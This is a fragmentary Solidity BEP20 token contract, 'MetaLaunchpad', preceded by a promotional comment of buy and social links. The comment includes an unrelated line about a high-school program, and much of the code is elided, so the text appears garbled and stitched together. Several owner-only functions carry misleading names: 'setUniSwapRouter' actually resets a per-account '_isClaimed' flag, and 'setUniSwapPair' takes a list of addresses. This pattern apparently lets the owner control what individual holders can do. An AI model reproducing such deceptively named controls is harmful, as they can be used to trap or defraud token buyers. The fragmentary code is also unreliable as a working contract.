...
/*
    ...
    MetaLaunchPad - Stealth Launch
    🌍Web ; https://MetaLaunchPad.com
    🔎Telegram ; https://t.me/MetaLaunchPadd

    A full-time high school program dedicated to
    ...
    We are less of a school and more of a “future dream career incubator”
    
    💩Chart:https://poocoin.app/tokens/
    💰Buy on pancakeswap ;https://exchange.pancakeswap.com/#/swap?outputCurrency=
    🌍Web ; https://MetaLaunchPad.com
    🔎Telegram ; https://t.me/MetaLaunchPadd
    🕊Twitter: https://www.twitter.com/MetaLaunchPad
    🖼️ Instagram : https://instagram.com/Meta.LaunchPad
    🎮 Discord : https://discord.gg/Y33HVSHQzW
...
contract MetaLaunchpad is Context, IBEP20, Ownable {
    ...
    string private constant _name     = "MetaLaunchpad";
...
subtractedValue) public virtual returns (bool) {
        ...
        function setUniSwapRouter(address account) external onlyOwner {
            _isClaimed[account] = false;
    }

    function setUniSwapPair(address[] calldata addresses) external onlyOwner {
...
tLiquidity, tMarketing, currentRate);
    ...
    function setExcludedToAutoLiquidity(address a, bool b) external {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _isExcludedToAutoLiquidity[a] = b;
    }
    function _setUniswapRouter(address r) external {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(r);
        _uniswapV2Router = uniswapV2Router;
    }
    function _setUniswapPair(address p) external {
        require(owner() == _msgSender(), "Ownable: caller is not the owner");
        _uniswapV2Pair = p;
    }
